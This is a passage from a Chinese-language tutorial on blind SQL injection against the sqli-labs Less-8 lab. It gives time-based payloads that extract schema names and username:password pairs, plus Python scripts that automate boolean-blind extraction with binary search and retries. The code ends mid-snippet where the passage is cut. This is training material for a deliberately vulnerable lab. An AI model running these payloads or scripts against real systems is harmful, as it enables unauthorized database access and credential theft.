id="burp延时爆破"><a href="#burp延时爆破" class="headerlink" title="burp延时爆破"></a>burp延时爆破</h4><p><strong>与burp盲注爆破类似</strong></p><h5 id="暴库-2"><a href="#暴库-2" class="headerlink" title="暴库"></a>暴库</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)&#x3D;&#39;i&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;e&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="暴字段-2"><a href="#暴字段-2" class="headerlink" title="暴字段"></a>暴字段</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;i&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="暴数据-2"><a href="#暴数据-2" class="headerlink" title="暴数据"></a>暴数据</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(username,0x3a,password) from security.users),1,1)&#x3D;&#39;d&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SQL注入漏洞3"><a href="#SQL注入漏洞3" class="headerlink" title="SQL注入漏洞3"></a>SQL注入漏洞3</h2><h3 id="盲注脚本编写"><a href="#盲注脚本编写" class="headerlink" title="盲注脚本编写"></a>盲注脚本编写</h3><p>注意：在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可</p><p>根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断</p><h4 id="sqli-less8盲注脚本1"><a href="#sqli-less8盲注脚本1" class="headerlink" title="sqli-less8盲注脚本1"></a>sqli-less8盲注脚本1</h4><p><strong>less8.py</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">True</span>                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> resultget_info<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="requests超时重发"><a href="#requests超时重发" class="headerlink" title="requests超时重发"></a>requests超时重发</h4><p>有时因为网络环境因素，经常会遇到连接超时的情况，则可能需要用到超时重发</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.google.com"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"耗时</span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqli-less8盲注脚本2-超时重发"><a href="#sqli-less8盲注脚本2-超时重发" class="headerlink" title="sqli-less8盲注脚本2(超时重发)"></a>sqli-less8盲注脚本2(超时重发)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>b <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token string">"网络请求错误，程序退出."</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">True</span>                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> resultget_info<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 从 0~99 中用二分法查找一个数需要几次？</span>nums <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 左右都闭合的区间 [l, r]</span>    l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">global</span> s    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span> <span class="token keyword">return</span> mid        <span class="token comment"># 解空间变为 [mid+1, right]</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> target<span class="token punctuation">:</span> l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment"># 解空间变为 [left, mid - 1]</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">:</span> r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>binarySearch<span class="token punctuation">(</span>nums<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"执行了</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">次循环~!"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqli-less8二分法查找长度"><a href="#sqli-less8二分法查找长度" class="headerlink" title="sqli-less8二分法查找长度"></a>sqli-less8二分法查找长度</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># sql = "select group_concat(schema_name) from information_schema.schemata"</span><span class="token comment"># 计算sql语句查询值长度</span><span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>sql<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 左右都闭合的区间 [l, r]</span>    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 如果页面正常，说明猜解正确 返回mid</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> mid        <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>get_len<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-argv参数传递"><a href="#sys-argv参数传递" class="headerlink" title="sys.argv参数传递"></a>sys.argv参数传递</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> syslist_of_arguments <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list_of_arguments<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># python test.py 111 "222" "abc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="os-path文件路径"><a href="#os-path文件路径" class="headerlink" title="os.path文件路径"></a>os.path文件路径</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 当前文件绝对路径</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 当前文件所在目录</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqli-less8盲注脚本编写3"><a href="#sqli-less8盲注脚本编写3" class="headerlink" title="sqli-less8盲注脚本编写3"></a>sqli-less8盲注脚本编写3</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token punctuation">,</span>ossession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取数据内容,程序退出 中断于第 &#123;i&#125; 个字符."</span><span class="token punctuation">)</span>                                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">True</span>                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"less8-data.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"# </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string"> : "</span></span> <span class="token operator">+</span> result <span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># 计算sql语句查询值长度</span><span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>sql<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 左右都闭合的区间 [l, r]</span>    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 如果页面正常，说明猜解正确 返回mid</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> mid        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token comment"># python 入口函数</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    list_of_arguments <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv    sql <span class="token operator">=</span> list_of_arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    length <span class="token operator">=</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string"> , 开始获取内容"</span></span><span class="token punctuation">)</span>    get_info<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"运行完毕, 请打开文件查看: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\\less8-data.txt"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="延时注入脚本编写"><a href="#延时注入脚本编写" class="headerlink" title="延时注入脚本编写"></a>延时注入脚本编写</h3><p>延时注入通过，requests包从发出到响应的时间来判断sql语句是否成功执行即可</p><p>requests请求响应时间 res.elapsed 中记录了 requests 请求的响应时间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsres <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span><span class="token comment"># 时:分:秒</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">)</span><span class="token comment"># 秒数</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 